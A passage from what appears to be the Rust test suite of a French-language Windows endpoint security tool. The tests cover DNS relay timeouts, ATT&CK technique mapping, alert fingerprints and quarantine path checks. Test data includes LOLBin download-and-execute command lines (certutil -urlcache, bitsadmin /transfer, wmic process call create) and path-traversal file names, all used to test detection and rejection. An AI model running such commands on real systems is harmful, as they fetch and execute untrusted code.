    assert!(f[..f.find("\n}").unwrap()].contains(".is_ok()"), "statut du générateur lu");
    for appel in ["port_dynamique(identifiant_aleatoire()?)", "let id = identifiant_aleatoire()?;", "let Some(id) = identifiant_aleatoire() else { return false };"] {
        assert!(s.contains(appel), "{appel}");
    }
}

/// Constat C-6 (audit du 2026-11-23) : relais TCP vers un amont borné par une échéance totale ; un amont qui goutte un
/// octet à la fois (sous le délai par lecture) ne tient plus sa place au-delà
#[test]
fn dns_relais_tcp_echeance_totale() {
    use std::io::{Read, Write};
    let l = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let cible = l.local_addr().unwrap();
    std::thread::spawn(move || {
        if let Ok((mut c, _)) = l.accept() {
            let mut t = [0u8; 512];
            let _ = c.read(&mut t);
            // Longueur annoncée 200, puis un octet toutes les 300 ms : 60 s sans échéance totale
            for o in [0u8, 200].into_iter().chain(std::iter::repeat(0u8)) {
                if c.write_all(&[o]).is_err() {
                    return;
                }
                std::thread::sleep(std::time::Duration::from_millis(300));
            }
        }
    });
    let p = requete_dns(5, "lent.test", 1);
    let r = requete_lue(&p);
    let debut = std::time::Instant::now();
    assert_eq!(crate::dns_local::relayer_tcp_vers(&p, &r.question, cible, crate::dns_local::ECHEANCE_TCP_AMONT), None);
    let duree = debut.elapsed();
    assert!(duree < crate::dns_local::ECHEANCE_TCP_AMONT + std::time::Duration::from_secs(2), "échéance totale tenue : {duree:?}");
}

/// Constat C-7 (audit du 2026-11-23) : 30 s d'échecs sur les seules requêtes des clients ne déclarent pas le silence ;
/// il faut que la sonde du service échoue aussi. Sonde répondue : fenêtre remise à zéro
#[test]
fn dns_silence_confirme_par_la_sonde() {
    let mut s = crate::dns_local::Sante::default();
    assert!(!s.noter(false, 100));
    assert!(s.noter(false, 130), "seuil atteint");
    assert!(!s.confirmer(true), "sonde répondue : pas de silence");
    assert!(!s.noter(false, 131), "fenêtre remise à zéro");
    assert!(!s.noter(false, 160));
    assert!(s.noter(false, 161));
    assert!(s.confirmer(false), "sonde muette aussi : silence");
    let src = include_str!("dns_local.rs");
    let r = &src[src.find("fn repondre(").unwrap()..];
    let r = &r[..r.find("fn prendre(").unwrap()];
    assert!(r.find("sonder(&amonts)").unwrap() < r.find(".confirmer(repond)").unwrap());
    assert!(r.find(".confirmer(repond)").unwrap() < r.find("f();").unwrap(), "cartes rendues seulement après la sonde");
    assert!(r.find(".confirmer(repond)").unwrap() < r.find("self.arret.store(true").unwrap(), "essai arrêté seulement après la sonde");
}

/// Parseur et réponses : aucune panique, quelle que soit l'entrée
#[test]
fn dns_torturer() {
    let bonne = requete_dns(1, "a.pub.test", 1);
    torturer(&bonne, &mut |p| {
        for max in [crate::dns_local::MAX_UDP, crate::dns_local::MAX_TCP] {
            if let crate::dns_local::Lecture::Requete(r) = crate::dns_local::lire_requete(p, max) {
                let _ = crate::dns_local::reponse_bloquee(&r);
                let _ = crate::dns_local::reponse_nxdomain(&r);
                let _ = crate::dns_local::traiter(&r, true, &|_: &str| true);
                let _ = crate::dns_local::reponse_assortie(p, r.id, &r.question.brute);
            }
        }
        let _ = crate::dns_local::reponse_assortie(p, 1, &bonne[12..]);
        let _ = crate::dns_local::avec_id(p, 2);
    });
}

/// MITRE : une destination de Microsoft n'est pas une capture audio ; l'usage du micro (VIE-001) l'est toujours
#[test]
fn mitre_micro_pas_microsoft() {
    use crate::commun::Alerte;
    let mut a = Alerte { regle: "RES-003".into(), raisons: "première connexion à Internet de ce programme (lancé par services)".into(),
        destination: "mobile.events.data.microsoft.com".into(), ..Default::default() };
    crate::mitre::enrichir(&mut a);
    assert!(!a.mitre.contains("T1123"), "{}", a.mitre);
    // VIE-001 : la technique est posée par le code qui produit l'alerte (surveillances.rs), plus par les mots du texte
    let mut v = Alerte { regle: "VIE-001".into(), raisons: "Zoom utilise le micro pour la première fois".into(), destination: "Micro".into(), mitre: "T1123".into(), ..Default::default() };
    crate::mitre::enrichir(&mut v);
    assert_eq!(v.mitre, "T1123 Capture audio");
    let mut c = Alerte { regle: "VIE-001".into(), raisons: "Zoom utilise la caméra pour la première fois".into(), destination: "Caméra".into(), mitre: "T1125".into(), ..Default::default() };
    crate::mitre::enrichir(&mut c);
    assert_eq!(c.mitre, "T1125 Capture vidéo");
}

// ------------------------------------------------------------ couverture ATT&CK, lot 2 : la technique vient de la règle

/// Chaque règle du registre a sa technique dans la table (liste fixe, posée par l'alerte, ou « aucune » dite) ; chaque
/// identifiant a une forme ATT&CK et un nom ; seules les règles à plusieurs comportements laissent leur code la poser
#[test]
fn attack_lot2_table_des_techniques_complete() {
    use crate::regles::{Techniques, REGLES};
    let mut par_l_alerte = Vec::new();
    for r in REGLES {
        match r.techniques {
            Techniques::Fixes(t) => {
                assert!(!t.is_empty(), "{} : liste fixe vide (écrire Aucune)", r.id);
                for id in t {
                    assert_eq!(crate::mitre::identifiants_du_texte(id), vec![id.to_string()], "{} : identifiant mal formé {id}", r.id);
                    assert_ne!(crate::mitre::libelle(id), *id, "{} : technique {id} sans nom dans mitre::NOMS", r.id);
                    // ATT&CK v20 : ces identifiants ont été déplacés (docs/validation/carte-attack.md)
                    assert!(!["T1562.001", "T1562.002", "T1562.004", "T1070.001", "T1176"].contains(id), "{} : identifiant d'avant v20 {id}", r.id);
                }
            }
            Techniques::ParLAlerte => par_l_alerte.push(r.id),
            Techniques::Aucune => {}
        }
    }
    par_l_alerte.sort();
    assert_eq!(par_l_alerte, ["CHA-001", "COR-R7", "EXP-DPI-001", "EXP-IDS-001", "EXP-NDR-001", "PER-001", "PER-002", "PRC-002", "PRC-003", "VIE-001", "VIE-002"]);
    // Toute technique posée par le code (identifiants littéraux) a un nom
    for (nom, source) in [("dpi", include_str!("dpi.rs")), ("ndr", include_str!("ndr.rs")), ("siem", include_str!("siem.rs")),
                          ("processus", include_str!("processus.rs")), ("persistance", include_str!("persistance.rs")),
                          ("parefeu", include_str!("parefeu.rs")), ("surveillances", include_str!("surveillances.rs"))] {
        for id in regex::Regex::new(r#""(T1[0-9]{3}(?:\.[0-9]{3})?)""#).unwrap().captures_iter(source) {
            assert_ne!(crate::mitre::libelle(&id[1]), &id[1], "{nom} : technique {} sans nom", &id[1]);
        }
    }
}

/// Plus aucune recherche de mots pour la technique : le texte de l'alerte ne la change pas, la règle si
#[test]
fn attack_lot2_technique_par_regle_et_non_par_mots() {
    use crate::commun::Alerte;
    let m = include_str!("mitre.rs");
    let conseils = &m[m.find("const CONSEILS").expect("table des conseils")..];
    assert!(!regex::Regex::new(r#""T1[0-9]{3}"#).unwrap().is_match(conseils), "technique restée dans la table des mots-clés");
    // « leurre » dans le texte d'une règle de santé : aucune technique (avant : T1486 par le mot)
    let mut a = Alerte { regle: "SAN-001".into(), raisons: "collecte Leurres indisponible : leurre non posé".into(), ..Default::default() };
    crate::mitre::enrichir(&mut a);
    assert_eq!(a.mitre, "");
    // LEU-001 sans le mot « leurre » : T1486 quand même
    let mut b = Alerte { regle: "LEU-001".into(), raisons: "fichier modifié".into(), ..Default::default() };
    crate::mitre::enrichir(&mut b);
    assert_eq!(b.mitre, "T1486 Chiffrement de données (rançongiciel)");
    // Plusieurs techniques : libellés séparés par « / » ; règle posée par l'alerte : identifiants du code
    let mut c = Alerte { regle: "PRC-002".into(), mitre: "T1059.001 / T1027".into(), ..Default::default() };
    crate::mitre::enrichir(&mut c);
    assert_eq!(c.mitre, "T1059.001 PowerShell / T1027 Code obscurci");
    let mut d = Alerte { regle: "EXP-NDR-001".into(), mitre: "T1557.002".into(), raisons: "usurpation ARP  [MITRE T1557.002]".into(), ..Default::default() };
    crate::mitre::enrichir(&mut d);
    assert_eq!(d.mitre, "T1557.002 Usurpation ARP");
    // Corrélation : la technique de l'incident vient de la table (COR-R4 : T1685.005, ancien T1070.001)
    assert_eq!(crate::mitre::identifiants_de_regle("COR-R4", "T1070.001"), ["T1685.005"]);
    assert_eq!(crate::mitre::identifiants_de_regle("COR-R7", "T1685.001"), ["T1685.001"], "COR-R7 : technique de l'événement");
}

/// Empreinte des exceptions : la règle et le code de comportement posé par le producteur, jamais le libellé
/// Prérelecture de #246, D1 ; audit, S246-01 : deux RES-002 du même programme vers la même destination, l'une « non
/// signé », l'autre « balise », restent deux comportements : une exception ou un apprentissage sur la première ne tait
/// pas la seconde ; deux alertes IDS de règles différentes non plus (S246-04)
#[test]
fn attack_lot2_empreinte_pas_plus_grossiere() {
    use crate::apprentissage::signature_avec;
    use crate::commun::Alerte;
    let base = Alerte { regle: "RES-002".into(), chemin: r"C:\x\a.exe".into(), destination: "203.0.113.5".into(), mitre: "T1071.001 / T1041 / T1105".into(), ..Default::default() };
    let non_signe = Alerte { raisons: "connexion suspecte : non signé".into(), comportement: "non-signe".into(), ..base.clone() };
    let balise = Alerte { raisons: "connexion suspecte : non signé, balise (connexions régulières)".into(), comportement: "balise+non-signe".into(), ..base.clone() };
    assert_ne!(signature_avec(&non_signe, "e"), signature_avec(&balise, "e"));
    let ids1 = Alerte { regle: "EXP-IDS-001".into(), raisons: "IDS sid 9000014 : Scanner Nmap".into(), comportement: "sid:9000014".into(), ..Default::default() };
    let ids2 = Alerte { regle: "EXP-IDS-001".into(), raisons: "IDS sid 9000015 : Scanner Nikto".into(), comportement: "sid:9000015".into(), ..Default::default() };
    assert_ne!(signature_avec(&ids1, "e"), signature_avec(&ids2, "e"));
    // VIE-002 : ngrok porte T1572, un autre outil T1219
    let mut v = Alerte { regle: "VIE-002".into(), mitre: "T1572".into(), ..Default::default() };
    crate::mitre::enrichir(&mut v);
    assert_eq!(v.mitre, "T1572 Tunnel de protocole");
}

/// Revue de l'auditeur du 2026-11-22, point 2 : l'empreinte ne dépend ni des techniques ATT&CK ni des conseils ;
/// changer une technique, un conseil ou le texte des raisons d'une alerte qui porte un code ne change aucune empreinte
#[test]
fn audit_p2_empreinte_independante_des_techniques_et_conseils() {
    use crate::apprentissage::signature_avec;
    use crate::commun::Alerte;
    let a = Alerte { regle: "PRC-003".into(), chemin: r"C:\Windows\System32\certutil.exe".into(),
        comportement: "PRC-003:certutil".into(), mitre: "T1105 / T1047".into(), conseil: "Vérifiez la commande.".into(),
        raisons: "outil détourné : certutil -urlcache".into(), ..Default::default() };
    let s = signature_avec(&a, "Microsoft");
    for b in [
        Alerte { mitre: "T1105".into(), ..a.clone() },
        Alerte { mitre: "T1105 Transfert d'outils / T1218 Exécution par binaire signé".into(), ..a.clone() },
        Alerte { mitre: String::new(), ..a.clone() },
        Alerte { conseil: "Autre conseil, réécrit.".into(), ..a.clone() },
        Alerte { raisons: "LOLBin : certutil (texte retouché)".into(), ..a.clone() },
    ] {
        assert_eq!(signature_avec(&b, "Microsoft"), s, "empreinte changée par technique, conseil ou texte");
    }
    // Un autre outil vu, ou une autre règle : une autre empreinte
    assert_ne!(signature_avec(&Alerte { comportement: "PRC-003:bitsadmin".into(), ..a.clone() }, "Microsoft"), s);
    assert_ne!(signature_avec(&Alerte { regle: "PRC-002".into(), ..a.clone() }, "Microsoft"), s);
    // Garde statique : le calcul de l'empreinte ne lit ni le module des techniques ni les conseils
    let src = include_str!("apprentissage.rs");
    let d = src.find("pub fn signature_avec").expect("signature_avec");
    let fin = src[d..].find("\n}").expect("fin de signature_avec");
    let corps = &src[d..d + fin];
    let code: String = corps.lines().filter(|l| !l.trim_start().starts_with("//")).collect();
    for interdit in ["mitre", "conseil"] {
        assert!(!code.contains(interdit), "signature_avec lit « {interdit} »");
    }
}

/// Revue de l'auditeur du 2026-11-22, point 2 : migration d'un format d'empreinte précédent, jamais un silence
#[test]
fn audit_p2_migration_comptee() {
    use crate::apprentissage::{migrer, Etat, Exception};
    let mut e = Etat { format: 2, ..Default::default() };
    e.exceptions.push(Exception { signature: "sha256:ancienne".into(), description: "a.exe".into(), date: "2026-11-01".into() });
    e.exceptions.push(Exception { signature: "sha256:autre".into(), description: "b.exe".into(), date: "2026-11-02".into() });
    for x in ["sha256:x", "sha256:y", "sha256:z"] {
        e.appris.insert(x.into());
    }
    assert!(migrer(&mut e));
    assert!(e.exceptions.is_empty() && e.appris.is_empty(), "rien d'ancien ne s'applique");
    assert_eq!(e.exceptions_perimees.len(), 2, "exceptions gardées (description, date)");
    assert_eq!(e.exceptions_perimees[0].description, "a.exe");
    assert_eq!(e.appris_perimes, 3);
    // Déjà au format : rien ne bouge
    assert!(!migrer(&mut e));
    assert_eq!((e.exceptions_perimees.len(), e.appris_perimes), (2, 3));
    // Le nombre est publié dans l'état pour la page Santé
    let m = include_str!("moniteur.rs");
    assert!(m.contains("exceptions_perimees: crate::apprentissage::perimes().0"));
}

/// Audit de #255, S255-05 et S255-06 : une copie de côté n'écrase jamais une copie existante
#[test]
fn audit_p2_copie_de_cote_jamais_ecrasee() {
    use crate::apprentissage::nom_libre;
    assert_eq!(nom_libre("apprentissage-illisible", "20261122101500", |_| false), "apprentissage-illisible-20261122101500.json");
    let pris = ["apprentissage-format2-1.json", "apprentissage-format2-1-2.json"];
    assert_eq!(nom_libre("apprentissage-format2", "1", |n| pris.contains(&n)), "apprentissage-format2-1-3.json");
    // Le démarrage ne réécrit pas un fichier qu'il n'a pas pu lire, et ne renomme que sur une erreur de format
    let src = include_str!("apprentissage.rs");
    assert!(src.contains("None if chemin.exists() => {\n                ecrire_au_demarrage = false;") || src.contains("None if chemin.exists() => {\r\n                ecrire_au_demarrage = false;"));
    assert!(src.contains("if ecrire_au_demarrage {"));
    assert!(!src.contains("\"apprentissage-illisible.json\""), "nom fixe");
    // S255-07 : tant que le fichier n'a pas été chargé, aucune écriture ne le remplace (une seule écriture hors démarrage)
    assert_eq!(src.matches("commun::ecrire(FICHIER").count(), 2, "écritures hors de enregistrer()");
    assert!(src.contains("if NON_CHARGE.load("));
}

/// Suivi de #255 et #258 : renommage en échec bloque les écritures ; réponse d'une exception en mémoire seulement ;
/// code de comportement de PRC-003 qui nomme chaque outil vu
#[test]
fn suivi_255_258_remarques() {
    let src = include_str!("apprentissage.rs");
    let i = src.find("ecrire_au_demarrage = r.is_ok();").expect("renommage");
    assert!(src[i..i + 400].contains("NON_CHARGE.store(true"), "renommage en échec sans blocage des écritures");
    use crate::apprentissage::reponse_exception;
    assert_eq!(reponse_exception("a.exe", false), "a.exe");
    assert!(reponse_exception("a.exe", true).contains("perdue au redémarrage"));
    assert!(include_str!("moniteur.rs").contains("apprentissage_non_charge: crate::apprentissage::non_charge()"));
    use crate::processus::code_comportement;
    use crate::regles::PRC_003;
    let deux = "cmd /c certutil -urlcache -f http://x/a.exe a.exe & wmic process call create a.exe";
    assert_eq!(code_comportement(false, &[PRC_003], deux), "PRC-003:certutil,wmic");
    assert_ne!(code_comportement(false, &[PRC_003], deux), code_comportement(false, &[PRC_003], "certutil -urlcache -f http://x/a.exe a.exe"));
}

/// Revue de l'auditeur du 2026-11-22, point 2 : codes de comportement posés par les producteurs
#[test]
fn audit_p2_codes_producteurs() {
    use crate::processus::{code_comportement, outils_lolbin};
    use crate::regles::{PRC_001, PRC_003};
    assert_eq!(outils_lolbin("CertUtil.exe -urlcache -f http://x/y"), ["certutil"]);
    assert!(outils_lolbin("notepad.exe").is_empty());
    assert_eq!(code_comportement(false, &[PRC_003], r"bitsadmin /transfer j http://x c:\y"), "PRC-003:bitsadmin");
    assert_eq!(code_comportement(true, &[PRC_003, PRC_001, PRC_003], "certutil -decode a b"), format!("document+{PRC_001}+PRC-003:certutil"));
    use crate::persistance::type_entree;
    for (c, t) in [("Run (machine)", "run"), ("RunOnce (machine, 32 bits)", "run"), ("Tâche planifiée", "tache"), ("Service", "service"),
                   ("Pilote", "pilote"), ("WMI", "wmi"), ("Dossier Démarrage", "dossier-demarrage"), ("Winlogon (u)", "winlogon"),
                   ("IFEO", "ifeo"), ("AppInit", "appinit"), ("Inconnue", "autre")] {
        assert_eq!(type_entree(c), t, "{c}");
    }
    use crate::moniteur::{codes_flux, IndicesFlux};
    let base = IndicesFlux { menace: None, non_signe: true, dossier_temporaire: false, origine: None, suspicion_ligne: None,
        nom_dns_connu: true, navigateur_doh: false, application_ip_directe: false, dns_lu: true, preexistant: false, balise: None,
        port: 443, telemetrie: false, bloque: false };
    assert_eq!(codes_flux(&base), "non-signe");
    assert_eq!(codes_flux(&IndicesFlux { balise: Some(60), ..base }), "balise+non-signe");
    assert_eq!(codes_flux(&IndicesFlux { nom_dns_connu: false, port: 4444, ..base }), "ip-directe+non-signe+port-inhabituel");
    // Pire cas : le code est borné et ASCII
    let mut a = crate::commun::Alerte { comportement: format!("é{}", "x".repeat(500)), ..Default::default() };
    crate::commun::borner_alerte(&mut a);
    assert!(a.comportement.is_ascii() && a.comportement.len() == 120);
}

#[test]
fn attack_lot2_empreinte_sur_les_identifiants() {
    use crate::apprentissage::signature_avec;
    use crate::commun::Alerte;
    let a = Alerte { regle: "PRC-002".into(), chemin: r"C:\x\p.exe".into(), mitre: "T1059.001 PowerShell / T1027 Code obscurci".into(), ..Default::default() };
    let b = Alerte { mitre: "T1059.001 PowerShell (renamed) / T1027 Obfuscated".into(), ..a.clone() };
    assert_eq!(signature_avec(&a, "e"), signature_avec(&b, "e"));
    let c = Alerte { regle: "PRC-003".into(), ..a.clone() };
    assert_ne!(signature_avec(&a, "e"), signature_avec(&c, "e"), "autre règle, autre comportement");
}

/// Couverture ATT&CK, lot 3 : la ligne « ATT&CK » de chaque fiche de docs/detection/regles.md (sous le titre, ou
/// dernière colonne d'un tableau) concorde avec la table du code ; la documentation ne peut plus diverger
#[test]
fn attack_lot3_fiches_et_table_concordent() {
    use crate::mitre::{identifiants_du_texte, libelle};
    use crate::regles::{Techniques, REGLES};
    let doc = include_str!("../../docs/detection/regles.md");
    for r in REGLES {
        let ligne = if let Some(i) = doc.find(&format!("
### {} : ", r.id)) {
            let l = doc[i + 1..].lines().nth(1).unwrap_or("");
            assert!(l.starts_with("- **ATT&CK** : "), "{} : ligne ATT&CK absente sous le titre ({l})", r.id);
            l["- **ATT&CK** : ".len()..].to_string()
        } else {
            let l = doc.lines().find(|l| l.starts_with(&format!("| {} |", r.id))).unwrap_or_else(|| panic!("{} : fiche absente", r.id));
            l.trim_end().trim_end_matches('|').rsplit('|').next().unwrap_or("").trim().to_string()
        };
        match r.techniques {
            Techniques::Fixes(t) => assert_eq!(identifiants_du_texte(&ligne), t.iter().map(|s| s.to_string()).collect::<Vec<_>>(), "{} : fiche et table divergent", r.id),
            Techniques::ParLAlerte => {
                assert!(ligne.starts_with("posée par l'alerte"), "{} : « posée par l'alerte » attendu ({ligne})", r.id);
                for id in identifiants_du_texte(&ligne) {
                    assert_ne!(libelle(&id), id, "{} : technique {id} de la fiche sans nom", r.id);
                }
            }
            Techniques::Aucune => assert!(ligne.starts_with("aucune"), "{} : « aucune » attendu ({ligne})", r.id),
        }
    }
}

/// Une chaîne PowerShell puis un outil Windows détourné ne reçoit plus T1204 par défaut : elle porte les techniques de
/// ses signaux
#[test]
fn attack_lot2_chaine_porte_les_techniques_de_ses_signaux() {
    use crate::natif::InfoListe;
    let mut arbre = crate::chaines::Arbre::default();
    let liste: std::collections::HashMap<u32, InfoListe> = [(100, ("explorer", 4)), (200, ("powershell", 100)), (300, ("cmd", 200))]
        .into_iter().map(|(pid, (nom, parent))| (pid, InfoListe { nom: nom.into(), parent })).collect();
    arbre.maj(&liste);
    arbre.signaler_avec(200, 5, "PowerShell obscurci ou qui télécharge du code", &crate::mitre::identifiants_de_regle("PRC-002", "T1059.001 / T1027"));
    arbre.signaler_avec(300, 7, "détournement d'outil Windows (LOLBin)", &["T1218".to_string()]);
    let mut a = arbre.alertes(&arbre.chaines());
    assert_eq!(a.len(), 1);
    assert_eq!(a[0].mitre, "T1059.001 / T1027 / T1218");
    crate::mitre::enrichir(&mut a[0]);
    assert!(!a[0].mitre.contains("T1204"), "{}", a[0].mitre);
    assert_eq!(a[0].mitre, "T1059.001 PowerShell / T1027 Code obscurci / T1218 Binaire système détourné");
    // Signaux sans technique : la chaîne n'en invente pas
    let mut b = crate::chaines::Arbre::default();
    b.maj(&liste);
    b.signaler(200, 6, "indice");
    b.signaler(300, 6, "autre indice");
    let mut c = b.alertes(&b.chaines());
    crate::mitre::enrichir(&mut c[0]);
    assert_eq!(c[0].mitre, "");
}

// ------------------------------------------------------------ audit du 2026-11-14, lot 1 (frontière du dossier de données)

/// B3 : un nom de copie qui sort du dossier de quarantaine (séparateur, « .. », chemin absolu, lecteur) est refusé
#[test]
fn audit_b3_nom_de_copie_simple() {
    use crate::reponse::nom_copie_simple as simple;
    for ok in ["abc-123.quarantaine", "a1b2_c3-d4-e5.quarantaine", "x"] {
        assert!(simple(ok), "{ok}");
    }
    let long = "a".repeat(201);
    for refuse in ["", "..\\victime.txt", "../victime.txt", "a/b", "a\\b", "C:\\Windows\\win.ini", "C:x", ".cache", "a..b",
                   "nom avec espace", "nom\u{0}nul", long.as_str()] {
        assert!(!simple(refuse), "{refuse:?}");
    }
    // S173-01 : identifiant non simple, même avec un nom enregistré simple : aucune action (la migration en bâtit un nom)
    use crate::reponse::ElementQuarantaine;
    let e = ElementQuarantaine { id: "..\\sortie".into(), fichier: "a.quarantaine".into(), ..Default::default() };
    assert_eq!(e.nom_fichier(), None);
    let e = ElementQuarantaine { id: "abc-123".into(), fichier: "abc-123-def.quarantaine".into(), ..Default::default() };
    assert_eq!(e.nom_fichier().as_deref(), Some("abc-123-def.quarantaine"));
}

/// B3 : à la reprise, une entrée forgée dont le nom de copie désigne un fichier hors du dossier ne fait rien
/// supprimer (avant le correctif : « en_cours », original intact, « copie » présente = le fichier visé, supprimé)
#[test]
fn audit_b3_reprise_entree_forgee_ne_supprime_rien() {
    use crate::reponse::{reprendre_quarantaine, ElementQuarantaine};
    let d = std::env::temp_dir().join(format!("der4tizer-audit-b3-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    let dq = d.join("quarantaine");
    std::fs::create_dir_all(&dq).unwrap();
    let original = d.join("original.txt");
    std::fs::write(&original, b"contenu").unwrap();
    let victime = d.join("victime.txt");
    std::fs::write(&victime, b"a garder").unwrap();
    let sha = crate::hygiene::empreinte_fichier(&original).expect("empreinte");
    for fichier in [victime.to_string_lossy().to_string(), "..\\victime.txt".to_string()] {
        let mut liste = vec![ElementQuarantaine { id: "abc".into(), chemin_origine: original.to_string_lossy().into(), fichier: fichier.clone(),
                                                  sha256: sha.clone(), etat: "en_cours".into(), ..Default::default() }];
        let messages = reprendre_quarantaine(&dq, &mut liste);
        assert!(victime.exists(), "fichier visé supprimé par {fichier}");
        assert_eq!(liste.len(), 1, "entrée conservée");
        assert_eq!(liste[0].etat, "en_cours", "entrée laissée telle quelle");
        assert!(messages.iter().any(|m| m.contains("nom de copie refusé")), "{messages:?}");
    }
    let _ = std::fs::remove_dir_all(&d);
}

/// B2 et B8 : adresse du manifeste revalidée à chaque vérification et passée par --url ; commandes qui réécrivent
/// config.json refusées en échec de la protection du dossier (contrôle de câblage)
#[test]
fn audit_b2_b8_cablage() {
    let maj = include_str!("maj.rs").replace("\r\n", "\n");
    let t = &maj[maj.find("fn telecharger(").unwrap()..];
    let t = &t[..t.find("\n}").unwrap()];
    assert!(t.contains(".arg(\"--url\")\n        .arg(url)"), "adresse par --url (B2)");
    let v = &maj[maj.find("fn verifier(config: &ConfigMaj").unwrap()..];
    let avant = &v[..v.find("telecharger(&config.url").unwrap()];
    assert!(avant.contains("commun::adresse_manifeste_simple(&config.url)"), "adresse revalidée avant le téléchargement (B2)");
    // B8, relecture de #173 (D1 à D3) : un seul point d'écriture de config.json, gardé en échec de protection ; plus
    // aucune écriture directe ailleurs dans le service
    let m = include_str!("moniteur.rs").replace("\r\n", "\n");
    let g = &m[m.find("fn ecrire_config(config: &commun::Config)").expect("ecrire_config")..];
    let g = &g[..g.find("\n}").unwrap()];
    let garde = g.find("commun::echec_protection().is_some()").expect("garde");
    assert!(garde < g.find(r#"commun::ecrire("config.json", config)"#).expect("écriture"), "garde avant l'écriture");
    assert_eq!(m.matches(r#"ecrire("config.json""#).count(), 1, "une seule écriture de config.json dans moniteur.rs");
    // Tout service-rs/src, hors fichiers de tests et hors moniteur.rs (relecture de #173, R2)
    let src = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("src");
    let mut vus = 0;
    for f in std::fs::read_dir(&src).unwrap().flatten() {
        let nom = f.file_name().to_string_lossy().to_string();
        if !nom.ends_with(".rs") || nom.starts_with("tests") || nom == "moniteur.rs" {
            continue;
        }
        vus += 1;
        let texte = std::fs::read_to_string(f.path()).unwrap();
        assert!(!texte.contains(r#"ecrire("config.json""#) && !texte.contains(r#"ecrire_dans("config.json""#), "écriture directe de config.json dans {nom}");
    }
    assert!(vus > 30, "modules lus : {vus}");
    for bras in [r#""config" => {"#, r#""reglages" => {"#, r#""majConfig" => {"#, r#""notifications" | "testerNotifications" => {"#] {
        let b = &m[m.find(bras).unwrap()..];
        let avant = &b[..b.find("ecrire_config(&self.config)").unwrap()];
        assert!(avant.contains("commun::echec_protection().is_some()"), "{bras} refusé en amont, message clair (B8)");
    }
    // R3 : le refus des notifications vaut pour les deux actions (enregistrer_secrets écrit notifications.json)
    let n = &m[m.find(r#""notifications" | "testerNotifications" => {"#).unwrap()..];
    let n = &n[..n.find("crate::notifications::enregistrer_secrets").unwrap()];
    assert!(n.contains("\n                if commun::echec_protection().is_some() {") && !n.contains("action == \"notifications\" &&"),
            "notifications et testerNotifications refusées avant enregistrer_secrets (S173-02, R3)");
    for f in [include_str!("moniteur.rs"), include_str!("siem.rs")] {
        assert!(!f.contains("Instant::now() - Duration"), "aucune soustraction d'Instant qui panique (A1)");
    }
}

// ------------------------------------------------------------ audit du 2026-11-14, lot 2 (lectures bornées)

/// A3 : un fichier des profils lu en SYSTEM est borné ; au-delà de la borne, rien n'est rendu (pas de JSON tronqué)
#[test]
fn audit_a3_lecture_profil_bornee() {
    use crate::hygiene::lire_profil_borne;
    let d = std::env::temp_dir().join(format!("der4tizer-audit-a3-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    struct Menage(std::path::PathBuf);
    impl Drop for Menage { fn drop(&mut self) { let _ = std::fs::remove_dir_all(&self.0); } }
    let _menage = Menage(d.clone());
    std::fs::create_dir_all(&d).unwrap();
    let f = d.join("manifest.json");
    std::fs::write(&f, vec![b'a'; 100]).unwrap();
    assert_eq!(lire_profil_borne(&f, 100).map(|t| t.len()), Some(100), "à la borne : lu");
    assert_eq!(lire_profil_borne(&f, 99), None, "au-delà de la borne : rien");
    assert_eq!(lire_profil_borne(&d.join("absent.json"), 100), None);
    let _ = std::fs::remove_dir_all(&d);
}

/// A2 et A8 : lectures à échéance pendant le cycle et la pose des leurres (contrôle de câblage)
#[test]
fn audit_a2_a8_cablage() {
    let r = include_str!("reponse.rs");
    let o = &r[r.find("pub fn origine(chemin: &str)").unwrap()..];
    let o = &o[..o.find("\n}").unwrap()];
    assert!(o.contains(r#"natif::lecture_fichier("marque""#) && o.contains("lire_marque_internet(&c)") && !o.contains("read_to_string"),
            "marque Internet bornée à 4 Ko et à échéance (A2)");
    let h = include_str!("hygiene.rs");
    let p = &h[h.find("let noms = noms_leurres();").unwrap()..];
    let p = &p[..p.find("FICHIER_LEURRES, &liste").unwrap()];
    assert!(!p.contains("empreinte_verifiee(&f)") && p.contains("empreinte_a_echeance(&f)"), "empreinte des leurres à échéance (A8)");
    let i = &h[h.find("pub fn inventaire_extensions()").unwrap()..];
    let i = &i[..i.find("\n}").unwrap()];
    assert!(!i.contains("fs::read_to_string"), "fichiers d'extensions lus bornés, sans suivre de lien (A3)");
}

/// S175-03 : au-delà de 20 nouvelles extensions au même relevé, une seule alerte de synthèse (les 1 000 alertes
/// gardées ne sont pas chassées)
#[test]
fn audit_s175_03_alertes_extensions_plafonnees() {
    use crate::hygiene::{nouvelles_extensions, Extension};
    let mut connues = std::collections::HashMap::new();
    let mut liste: Vec<Extension> = (0..500).map(|i| Extension { navigateur: "Chrome (Default)".into(), id: format!("id{i}"), nom: format!("ext{i}"), ..Default::default() }).collect();
    let a = nouvelles_extensions(&mut liste, &mut connues, false);
    assert_eq!(a.len(), 21, "20 alertes puis une synthèse");
    assert!(a[20].raisons.contains("480 autre(s)"), "{}", a[20].raisons);
    assert_eq!(connues.len(), 500, "toutes mémorisées : pas d'alerte au relevé suivant");
    assert!(nouvelles_extensions(&mut liste, &mut connues, false).is_empty());
}

/// S175-01 et S175-02 : leurre hors délai gardé dans la liste, audit posé avant le second contrôle ; origine hors
/// délai jamais mise en cache (contrôle de câblage)
#[test]
fn audit_s175_01_02_cablage() {
    let h = include_str!("hygiene.rs").replace("\r\n", "\n");
    let p = &h[h.find("let noms = noms_leurres();").unwrap()..];
    let p = &p[..p.find("FICHIER_LEURRES, &liste").unwrap()];
    assert!(p.contains("commun::lire(FICHIER_LEURRES)") && p.matches("garder_precedent(&mut liste, &f)").count() == 2, "leurre hors délai gardé (S175-01 ; empreinte avant, pose sur un seul handle S268-04)");
    // S175-01 : l'audit est posé dans la même ouverture que la lecture de l'empreinte (S268-04), jamais après elle
    let q = &h[h.find("fn poser_a_echeance(").unwrap()..];
    let q = &q[..q.find("
}
").unwrap()];
    assert!(q.contains("poser_audit_par_handle(") && q.contains("empreinte_lue") && p.contains("let e = match poser_a_echeance(&f)"), "audit avant la lecture de l'empreinte (S175-01)");
    let m = include_str!("moniteur.rs");
    assert!(!m.contains("self.origines.entry(chemin.clone()).or_insert_with"), "origine hors délai jamais en cache (S175-02)");
    assert!(m.contains("if reponse::origine_a_garder(&o) {"), "origine hors délai jamais en cache (S175-02)");
}

/// S175-02 : décision pure de mise en cache de l'origine
#[test]
fn audit_s175_02_origine_hors_delai_pas_en_cache() {
    use crate::reponse::{origine_a_garder, Origine};
